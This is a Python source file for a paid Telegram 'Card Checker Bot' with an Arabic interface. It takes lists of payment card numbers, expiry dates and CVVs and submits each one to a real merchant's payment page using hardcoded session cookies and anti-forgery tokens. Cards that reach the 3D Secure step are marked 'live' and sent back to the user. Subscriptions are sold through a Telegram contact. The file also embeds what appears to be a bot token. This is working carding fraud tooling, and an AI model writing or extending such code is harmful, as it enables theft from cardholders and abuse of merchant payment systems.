import logging
import asyncio
import io
import json
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict

import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler,
    MessageHandler, filters, CallbackQueryHandler
)

# Configuration
TOKEN = os.getenv("TOKEN", "8454654027:AAGF0kVGZlYTVs5qADs3zSwN3pmdH5rqNQ8")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5895491379"))
PAYMENT_CONTACT = "@Bangladesh3456"
CHECK_DELAY = 10  # 10 seconds between checks
DATA_FILE = "users_data.json"

# Subscription plans
SUBSCRIPTION_PLANS = {
    "1_hour": {"name": "ساعة واحدة", "duration": 3600, "price": "اتصل للسعر"},
    "1_day": {"name": "يوم واحد", "duration": 86400, "price": "اتصل للسعر"},
    "1_week": {"name": "أسبوع واحد", "duration": 604800, "price": "اتصل للسعر"},
    "1_month": {"name": "شهر واحد", "duration": 2592000, "price": "اتصل للسعر"}
}

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Data classes
@dataclass
class UserSubscription:
    plan: str = ""
    expires_at: float = 0
    is_active: bool = False

@dataclass
class UserData:
    user_id: int
    username: str = ""
    subscription: UserSubscription = None
    cards: List[str] = None
    live_cards: List[str] = None
    current_index: int = 0
    is_checking: bool = False
    is_paused: bool = False
    status_message_id: Optional[int] = None
    
    def __post_init__(self):
        if self.subscription is None:
            self.subscription = UserSubscription()
        if self.cards is None:
            self.cards = []
        if self.live_cards is None:
            self.live_cards = []


class DataManager:
    """Manages user data persistence"""
    
    def __init__(self, filename: str = DATA_FILE):
        self.filename = filename
        self.data: Dict[int, UserData] = {}
        self.load_data()
    
    def load_data(self):
        """Load data from JSON file"""
        try:
            with open(self.filename, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for user_id_str, user_dict in data.items():
                    user_id = int(user_id_str)
                    # Convert dict back to UserData object
                    sub_dict = user_dict.get('subscription', {})
                    subscription = UserSubscription(**sub_dict)
                    
                    self.data[user_id] = UserData(
                        user_id=user_id,
                        username=user_dict.get('username', ''),
                        subscription=subscription,
                        cards=user_dict.get('cards', []),
                        live_cards=user_dict.get('live_cards', []),
                        current_index=user_dict.get('current_index', 0),
                        is_checking=False,  # Always reset checking state on startup
                        is_paused=False,
                        status_message_id=user_dict.get('status_message_id')
                    )
        except FileNotFoundError:
            self.data = {}
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            self.data = {}
    
    def save_data(self):
        """Save data to JSON file"""
        try:
            data_dict = {}
            for user_id, user_data in self.data.items():
                data_dict[str(user_id)] = {
                    'user_id': user_data.user_id,
                    'username': user_data.username,
                    'subscription': asdict(user_data.subscription),
                    'cards': user_data.cards,
                    'live_cards': user_data.live_cards,
                    'current_index': user_data.current_index,
                    'is_checking': user_data.is_checking,
                    'is_paused': user_data.is_paused,
                    'status_message_id': user_data.status_message_id
                }
            
            with open(self.filename, 'w', encoding='utf-8') as f:
                json.dump(data_dict, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving data: {e}")
    
    def get_user(self, user_id: int, username: str = "") -> UserData:
        """Get or create user data"""
        if user_id not in self.data:
            self.data[user_id] = UserData(user_id=user_id, username=username)
        else:
            self.data[user_id].username = username
        return self.data[user_id]
    
    def is_subscription_active(self, user_id: int) -> bool:
        """Check if user has active subscription"""
        if user_id not in self.data:
            return False
        
        user_data = self.data[user_id]
        if not user_data.subscription.is_active:
            return False
        
        return datetime.now().timestamp() < user_data.subscription.expires_at


class CardChecker:
    """Handles card checking logic"""
    
    def __init__(self):
        self.session = requests.Session()
        self.cookies = {
            '.AspNetCore.Antiforgery.ct0OCrh2AQg': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqfAjUWrV7x-otIGacRXJZlfNAtDRtbPqWyCSSVPB-M0ksvBWng7a7nqay-sQvT4rd2NJRQPiMLzUMd16BNnuh5iM4WliAkOsq9JUq10w0rVuR-B3u7aUfLU66N06D9Zlzo',
            'SERVERID': 'srv3_d9ef_136|aJsqV|aJsqH',
        }
        
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'DNT': '1',
            'Origin': 'https://ecommerce.its-connect.com',
            'Referer': 'https://ecommerce.its-connect.com/PayPage/CEF',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
    
    async def check_card(self, card: str) -> bool:
        """Check a single card - returns True if 3D Secure (Live)"""
        try:
            card_parts = card.strip().split("|")
            if len(card_parts) != 4:
                return False
            
            number, month, year, cvv = card_parts
            
            if len(year) == 4:
                year = year[-2:]
            
            data = {
                'DigitalWalletToken': '',
                'DigitalWallet': '',
                'CardNumber': number,
                'ExpiryMonth': month,
                'ExpiryYear': year,
                'CardHolderName': cvv,
                'CVV': cvv,
                'PageSessionId': '6kKqDaerAMCo7o88E2DnsjJlvO5',
                'ITSBrowserScreenHeight': '786',
                'ITSBrowserScreenWidth': '1397',
                'ITSBrowserScreenColorDepth': '24',
                'ITSBrowserTimeZoneOffset': '-180',
                'ITSBrowserHasJavaScript': 'true',
                'ITSBrowserHasJava': 'false',
                'ITSBrowserLanguage': 'en',
                '__RequestVerificationToken': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqf1YXYyijrfbV7QR8ut_XmcP5ujman4W6QH3JcSmorRBPLmd2PvzRvW-9Zn-X__dQnWRdlTPWDtyHeoG-XCrLV2X6RU5gI5dasMudnyOeqLNDKFaeXRyF-wz1sAP6oSsg4',
            }

            response = self.session.post(
                'https://ecommerce.its-connect.com/PayPage/Submit/6kKqDaerAMCo7o88E2DnsjJlvO5',
                cookies=self.cookies,
                headers=self.headers,
                data=data,
                timeout=30
            )
            
            response_text = response.text.lower()
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string.strip().lower() if soup.title else ""

            # Check for 3D Secure (Live cards)
            return "acs authentication redirect page" in title or "acs authentication redirect page" in response_text
                
        except Exception as e:
            logger.error(f"Error checking card {card}: {e}")
            return False


class TelegramBot:
    """Main bot class"""
    
    def __init__(self):
        self.card_checker = CardChecker()
        self.data_manager = DataManager()
        self.checking_tasks: Dict[int, asyncio.Task] = {}
    
    def create_progress_bar(self, current: int, total: int, length: int = 15) -> str:
        """Create visual progress bar"""
        if total == 0:
            return "▫️" * length
        
        done_length = int(length * current / total)
        remaining = length - done_length
        return "🟩" * done_length + "▫️" * remaining
    
    def get_subscription_keyboard(self) -> InlineKeyboardMarkup:
        """Get subscription plans keyboard"""
        keyboard = []
        for plan_id, plan_info in SUBSCRIPTION_PLANS.items():
            keyboard.append([
                InlineKeyboardButton(
                    f"🔥 {plan_info['name']} - {plan_info['price']}", 
                    callback_data=f"sub_{plan_id}"
                )
            ])
        
        keyboard.append([InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_main_menu_keyboard(self, user_data: UserData) -> InlineKeyboardMarkup:
        """Get main menu keyboard"""
        keyboard = []
        
        if self.data_manager.is_subscription_active(user_data.user_id):
            keyboard.extend([
                [InlineKeyboardButton("📋 إضافة كومبو", callback_data="add_cards")],
                [InlineKeyboardButton("▶️ بدء الفحص", callback_data="start_check")],
                [InlineKeyboardButton("📊 النتائج", callback_data="view_results")],
                [InlineKeyboardButton("📥 تحميل الملفات", callback_data="download")],
                [InlineKeyboardButton("🗑 مسح البيانات", callback_data="clear_data")]
            ])
        else:
            keyboard.append([InlineKeyboardButton("💎 الاشتراكات", callback_data="subscription")])
        
        keyboard.append([InlineKeyboardButton("ℹ️ معلومات الحساب", callback_data="account_info")])
        
        return InlineKeyboardMarkup(keyboard)
    
    def get_checking_keyboard(self, is_paused: bool) -> InlineKeyboardMarkup:
        """Get checking control keyboard"""
        keyboard = []
        
        if is_paused:
            keyboard.append([InlineKeyboardButton("▶️ استكمال", callback_data="resume")])
        else:
            keyboard.append([InlineKeyboardButton("⏸️ إيقاف مؤقت", callback_data="pause")])
        
        keyboard.extend([
            [InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data="stop_check")],
            [InlineKeyboardButton("📊 النتائج", callback_data="view_results")]
        ])
        
        return InlineKeyboardMarkup(keyboard)
    
    async def send_main_menu(self, context: ContextTypes.DEFAULT_TYPE, 
                           chat_id: int, message_id: int = None):
        """Send main menu"""
        user_data = self.data_manager.get_user(chat_id, "")
        
        # Check subscription status
        is_active = self.data_manager.is_subscription_active(chat_id)
        
        if is_active:
            expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
            status_text = f"✅ نشط حتى: {expires_at.strftime('%Y-%m-%d %H:%M')}"
        else:
            status_text = "❌ غير نشط"
        
        text = (
            f"🤖 *Card Checker Bot*\n\n"
            f"👤 المستخدم: {user_data.username or 'غير معروف'}\n"
            f"📊 حالة الاشتراك: {status_text}\n"
            f"📋 الكومبو المحمل: {len(user_data.cards)}\n"
            f"✅ الحية: {len(user_data.live_cards)}\n"
            f"🔍 تم فحص: {user_data.current_index}/{len(user_data.cards)}\n\n"
            f"اختر من القائمة:"
        )
        
        keyboard = self.get_main_menu_keyboard(user_data)
        
        try:
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode="Markdown",
                    reply_markup=keyboard
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    text,
                    parse_mode="Markdown",
                    reply_markup=keyboard
                )
        except Exception as e:
            logger.error(f"Error sending main menu: {e}")
    
    async def update_checking_status(self, context: ContextTypes.DEFAULT_TYPE, 
                                   chat_id: int, user_data: UserData):
        """Update checking status message"""
        progress_bar = self.create_progress_bar(user_data.current_index, len(user_data.cards))
        
        remaining = len(user_data.cards) - user_data.current_index
        
        text = (
            f"🔍 *جاري الفحص...*\n\n"
            f"📊 التقدم: {progress_bar}\n"
            f"✅ حية: *{len(user_data.live_cards)}*\n"
            f"🔍 تم فحص: *{user_data.current_index}*\n"
            f"⏳ متبقي: *{remaining}*\n"
            f"📋 إجمالي: *{len(user_data.cards)}*\n\n"
            f"⏱️ سرعة الفحص: 10 ثواني لكل كارت\n"
            f"حالة: {'⏸️ متوقف مؤقتاً' if user_data.is_paused else '▶️ يعمل'}"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=user_data.status_message_id,
                text=text,
                parse_mode="Markdown",
                reply_markup=self.get_checking_keyboard(user_data.is_paused)
            )
        except Exception as e:
            logger.warning(f"Failed to update status: {e}")
    
    async def run_checker(self, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
        """Main checking loop"""
        user_data = self.data_manager.get_user(chat_id, "")
        
        while (user_data.current_index < len(user_data.cards) and 
               user_data.is_checking and
               self.data_manager.is_subscription_active(chat_id)):
            
            if user_data.is_paused:
                await asyncio.sleep(2)
                continue
            
            card = user_data.cards[user_data.current_index]
            
            # Check card
            is_live = await self.card_checker.check_card(card)
            
            if is_live:
                user_data.live_cards.append(card)
                # Send live card immediately
                await context.bot.send_message(
                    chat_id,
                    f"✅ *كارت حي!*\n`{card}`\n\n🔥 3D Secure",
                    parse_mode="Markdown"
                )
            
            user_data.current_index += 1
            
            # Update status
            await self.update_checking_status(context, chat_id, user_data)
            
            # Save progress
            self.data_manager.save_data()
            
            # Wait between checks
            await asyncio.sleep(CHECK_DELAY)
        
        # Checking completed or stopped
        user_data.is_checking = False
        self.data_manager.save_data()
        
        if user_data.current_index >= len(user_data.cards):
            await context.bot.send_message(
                chat_id,
                f"✅ *اكتمل الفحص!*\n\n"
                f"📊 النتائج:\n"
                f"✅ حية: *{len(user_data.live_cards)}*\n"
                f"📋 إجمالي: *{len(user_data.cards)}*",
                parse_mode="Markdown"
            )
        
        # Remove task
        if chat_id in self.checking_tasks:
            del self.checking_tasks[chat_id]
    
    async def send_results_files(self, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
        """Send result files"""
        user_data = self.data_manager.get_user(chat_id, "")
        
        if not user_data.live_cards:
            await context.bot.send_message(chat_id, "ℹ️ لا توجد كروت حية لتحميلها.")
            return
        
        try:
            # Create live cards file
            live_file_content = "\n".join(user_data.live_cards)
            file_obj = io.StringIO(live_file_content)
            file_obj.seek(0)
            
            await context.bot.send_document(
                chat_id,
                file_obj,
                filename=f"live_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                caption=f"✅ *الكروت الحية ({len(user_data.live_cards)})*",
                parse_mode="Markdown"
            )
                
        except Exception as e:
            logger.error(f"Error sending files: {e}")
            await context.bot.send_message(chat_id, "❌ خطأ في إرسال الملفات.")
    
    # Command Handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        chat_id = update.effective_chat.id
        username = update.effective_user.username or ""
        
        user_data = self.data_manager.get_user(chat_id, username)
        self.data_manager.save_data()
        
        welcome_text = (
            f"🚀 *أهلاً بك في Card Checker Bot!*\n\n"
            f"🔥 *المميزات:*\n"
            f"• فحص احترافي للكروت\n"
            f"• سرعة 10 ثواني بين كل فحص\n"
            f"• يجيب فقط الكروت الحية (3D Secure)\n"
            f"• نظام اشتراكات متنوع\n"
            f"• دعم لأكثر من 100 مستخدم\n\n"
            f"📞 *للدفع والاشتراك:* {PAYMENT_CONTACT}\n\n"
            f"*صيغة الكومبو:*\n"
            f"`Number|MM|YYYY|CVV`\n"
            f"*مثال:* `4532123456789012|12|2025|123`"
        )
        
        await update.message.reply_text(
            welcome_text,
            parse_mode="Markdown",
            reply_markup=self.get_main_menu_keyboard(user_data)
        )
    
    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin panel command"""
        if update.effective_user.id != ADMIN_ID:
            return
        
        if len(context.args) < 3:
            await update.message.reply_text(
                "استخدام: /admin <user_id> <plan> <hours>\n"
                "مثال: /admin 123456789 1_day 24"
            )
            return
        
        try:
            user_id = int(context.args[0])
            plan = context.args[1]
            hours = int(context.args[2])
            
            if plan not in SUBSCRIPTION_PLANS:
                await update.message.reply_text("خطة اشتراك غير صحيحة!")
                return
            
            # Set subscription
            user_data = self.data_manager.get_user(user_id, "")
            user_data.subscription.plan = plan
            user_data.subscription.expires_at = datetime.now().timestamp() + (hours * 3600)
            user_data.subscription.is_active = True
            
            self.data_manager.save_data()
            
            # Notify user
            plan_name = SUBSCRIPTION_PLANS[plan]["name"]
            expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
            
            try:
                await context.bot.send_message(
                    user_id,
                    f"✅ *تم تفعيل اشتراكك!*\n\n"
                    f"📦 الخطة: {plan_name}\n"
                    f"⏰ ينتهي في: {expires_at.strftime('%Y-%m-%d %H:%M')}\n\n"
                    f"يمكنك الآن استخدام البوت! 🎉",
                    parse_mode="Markdown"
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ تم تفعيل اشتراك المستخدم {user_id}\n"
                f"الخطة: {plan_name}\n"
                f"المدة: {hours} ساعة"
            )
            
        except ValueError:
            await update.message.reply_text("معرف المستخدم أو المدة غير صحيح!")
        except Exception as e:
            await update.message.reply_text(f"خطأ: {e}")
    
    async def receive_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle card input"""
        chat_id = update.effective_chat.id
        user_data = self.data_manager.get_user(chat_id, update.effective_user.username or "")
        
        if not self.data_manager.is_subscription_active(chat_id):
            await update.message.reply_text(
                "❌ يجب أن يكون لديك اشتراك نشط لاستخدام البوت!\n\n"
                f"للاشتراك تواصل مع: {PAYMENT_CONTACT}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 الاشتراكات", callback_data="subscription")]
                ])
            )
            return
        
        # Stop current checking if running
        if user_data.is_checking:
            await update.message.reply_text("⚠️ يجب إيقاف الفحص الحالي أولاً!")
            return
        
        # Parse cards
        text = update.message.text.strip()
        new_cards = [card.strip() for card in text.split("\n") if card.strip() and "|" in card]
        
        if not new_cards:
            await update.message.reply_text(
                "❌ صيغة الكومبو غير صحيحة!\n\n"
                "*الصيغة الصحيحة:*\n"
                "`Number|MM|YYYY|CVV`"
            )
            return
        
        # Reset session for new combo
        user_data.cards = new_cards
        user_data.live_cards = []
        user_data.current_index = 0
        user_data.is_checking = False
        user_data.is_paused = False
        
        self.data_manager.save_data()
        
        await update.message.reply_text(
            f"✅ *تم تحميل الكومبو بنجاح!*\n\n"
            f"📊 عدد الكروت: *{len(new_cards)}*\n\n"
            f"جاهز لبدء الفحص! 🚀",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ بدء الفحص", callback_data="start_check")],
                [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
            ])
        )
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all button callbacks"""
        query = update.callback_query
        await query.answer()
        
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        username = query.from_user.username or ""
        
        user_data = self.data_manager.get_user(chat_id, username)
        
        if query.data == "main_menu":
            await self.send_main_menu(context, chat_id, message_id)
        
        elif query.data == "subscription":
            text = (
                f"💎 *خطط الاشتراك*\n\n"
                f"اختر الخطة المناسبة لك:\n\n"
                f"💰 جميع الأسعار متاحة عند التواصل\n"
                f"📞 للاشتراك: {PAYMENT_CONTACT}"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=self.get_subscription_keyboard()
            )
        
        elif query.data.startswith("sub_"):
            plan_id = query.data[4:]
            plan_info = SUBSCRIPTION_PLANS.get(plan_id)
            
            if plan_info:
                text = (
                    f"📦 *{plan_info['name']}*\n\n"
                    f"💰 السعر: {plan_info['price']}\n\n"
                    f"📞 للاشتراك تواصل مع: {PAYMENT_CONTACT}\n"
                    f"🆔 معرفك: `{chat_id}`\n\n"
                    f"ارسل معرفك مع اسم الخطة للمطور"
                )
                await query.edit_message_text(
                    text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                    ])
                )
        
        elif query.data == "account_info":
            is_active = self.data_manager.is_subscription_active(chat_id)
            
            if is_active:
                expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
                remaining_time = expires_at - datetime.now()
                hours = int(remaining_time.total_seconds() // 3600)
                minutes = int((remaining_time.total_seconds() % 3600) // 60)
                
                status_text = f"✅ نشط\n⏰ متبقي: {hours} ساعة و {minutes} دقيقة"
            else:
                status_text = "❌ غير نشط"
            
            text = (
                f"👤 *معلومات الحساب*\n\n"
                f"🆔 المعرف: `{chat_id}`\n"
                f"👤 اليوزر: @{username or 'غير معروف'}\n"
                f"📊 حالة الاشتراك: {status_text}\n"
                f"📋 الكومبو المحمل: {len(user_data.cards)}\n"
                f"✅ الكروت الحية: {len(user_data.live_cards)}\n"
                f"🔍 تم فحص: {user_data.current_index}"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "add_cards":
            if not self.data_manager.is_subscription_active(chat_id):
                await query.edit_message_text(
                    "❌ يجب أن يكون لديك اشتراك نشط!\n\n"
                    f"📞 للاشتراك: {PAYMENT_CONTACT}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💎 الاشتراكات", callback_data="subscription")],
                        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                    ])
                )
                return
            
            text = (
                f"📋 *إضافة كومبو جديد*\n\n"
                f"أرسل الكومبو بالصيغة التالية:\n"
                f"`Number|MM|YYYY|CVV`\n\n"
                f"*مثال:*\n"
                f"`4532123456789012|12|2025|123`\n"
                f"`4916123456789012|01|2026|456`\n\n"
                f"📝 يمكنك إرسال عدة كروت (كل كارت في سطر منفصل)"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "start_check":
            if not self.data_manager.is_subscription_active(chat_id):
                await query.edit_message_text(
                    "❌ انتهت صلاحية اشتراكك!",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💎 تجديد الاشتراك", callback_data="subscription")]
                    ])
                )
                return
            
            if not user_data.cards:
                await query.edit_message_text(
                    "❌ لا يوجد كومبو محمل!\n\nأضف كومبو أولاً.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📋 إضافة كومبو", callback_data="add_cards")],
                        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                    ])
                )
                return
            
            if user_data.is_checking:
                await query.edit_message_text("⚠️ الفحص يعمل بالفعل!")
                return
            
            if user_data.current_index >= len(user_data.cards):
                await query.edit_message_text(
                    "✅ تم فحص جميع الكروت!\n\nأضف كومبو جديد لبدء فحص جديد.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📋 كومبو جديد", callback_data="add_cards")],
                        [InlineKeyboardButton("📊 النتائج", callback_data="view_results")]
                    ])
                )
                return
            
            # Start checking
            user_data.is_checking = True
            user_data.is_paused = False
            
            # Create status message
            msg = await context.bot.send_message(
                chat_id,
                "🔍 *بدء الفحص...*",
                parse_mode="Markdown",
                reply_markup=self.get_checking_keyboard(False)
            )
            user_data.status_message_id = msg.message_id
            
            self.data_manager.save_data()
            
            # Start checking task
            task = asyncio.create_task(self.run_checker(context, chat_id))
            self.checking_tasks[chat_id] = task
            
            await query.delete_message()
        
        elif query.data == "pause":
            user_data.is_paused = True
            self.data_manager.save_data()
            await self.update_checking_status(context, chat_id, user_data)
        
        elif query.data == "resume":
            user_data.is_paused = False
            self.data_manager.save_data()
            await self.update_checking_status(context, chat_id, user_data)
        
        elif query.data == "stop_check":
            user_data.is_checking = False
            user_data.is_paused = False
            
            # Cancel task
            if chat_id in self.checking_tasks:
                self.checking_tasks[chat_id].cancel()
                del self.checking_tasks[chat_id]
            
            self.data_manager.save_data()
            
            await query.edit_message_text(
                "⏹️ *تم إيقاف الفحص*\n\n"
                f"📊 النتائج حتى الآن:\n"
                f"✅ حية: *{len(user_data.live_cards)}*\n"
                f"🔍 تم فحص: *{user_data.current_index}*\n"
                f"📋 إجمالي: *{len(user_data.cards)}*",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 عرض النتائج", callback_data="view_results")],
                    [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "view_results":
            if not user_data.cards:
                await query.edit_message_text(
                    "ℹ️ لا توجد نتائج لعرضها.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                    ])
                )
                return
            
            live_cards_preview = ""
            if user_data.live_cards:
                preview_cards = user_data.live_cards[:5]  # Show first 5
                live_cards_preview = "\n".join([f"`{card}`" for card in preview_cards])
                if len(user_data.live_cards) > 5:
                    live_cards_preview += f"\n... و {len(user_data.live_cards) - 5} كارت آخر"
            else:
                live_cards_preview = "لا توجد كروت حية حتى الآن"
            
            text = (
                f"📊 *نتائج الفحص*\n\n"
                f"📋 إجمالي الكومبو: *{len(user_data.cards)}*\n"
                f"🔍 تم فحص: *{user_data.current_index}*\n"
                f"✅ حية: *{len(user_data.live_cards)}*\n"
                f"📈 معدل النجاح: *{(len(user_data.live_cards)/max(user_data.current_index,1)*100):.1f}%*\n\n"
                f"🔥 *الكروت الحية:*\n{live_cards_preview}"
            )
            
            keyboard = []
            if user_data.live_cards:
                keyboard.append([InlineKeyboardButton("📥 تحميل الحية", callback_data="download")])
            
            keyboard.extend([
                [InlineKeyboardButton("🔍 فحص جديد", callback_data="add_cards")],
                [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
            ])
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif query.data == "download":
            await query.answer("📥 جاري تحضير الملف...")
            await self.send_results_files(context, chat_id)
        
        elif query.data == "clear_data":
            text = (
                "⚠️ *تأكيد مسح البيانات*\n\n"
                "سيتم مسح:\n"
                f"• {len(user_data.cards)} كارت من الكومبو\n"
                f"• {len(user_data.live_cards)} كارت حي\n"
                f"• جميع نتائج الفحص\n\n"
                "هل أنت متأكد؟"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ نعم، امسح", callback_data="confirm_clear")],
                    [InlineKeyboardButton("❌ إلغاء", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "confirm_clear":
            # Stop checking if running
            if user_data.is_checking:
                user_data.is_checking = False
                if chat_id in self.checking_tasks:
                    self.checking_tasks[chat_id].cancel()
                    del self.checking_tasks[chat_id]
            
            # Clear data
            user_data.cards = []
            user_data.live_cards = []
            user_data.current_index = 0
            user_data.is_checking = False
            user_data.is_paused = False
            user_data.status_message_id = None
            
            self.data_manager.save_data()
            
            await query.edit_message_text(
                "✅ *تم مسح جميع البيانات بنجاح!*\n\nيمكنك الآن إضافة كومبو جديد.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 إضافة كومبو", callback_data="add_cards")],
                    [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                ])
            )


def main():
    """Main function"""
    logger.info("🚀 Starting Professional Card Checker Bot...")
    
    bot = TelegramBot()
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", bot.start_command))
    app.add_handler(CommandHandler("admin", bot.admin_command))
    
    # Callback handler
    app.add_handler(CallbackQueryHandler(bot.callback_handler))
    
    # Card input handler
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, 
        bot.receive_cards
    ))
    
    logger.info("✅ Bot is running and ready to serve users!")
    app.run_polling()


if __name__ == "__main__":
    main()
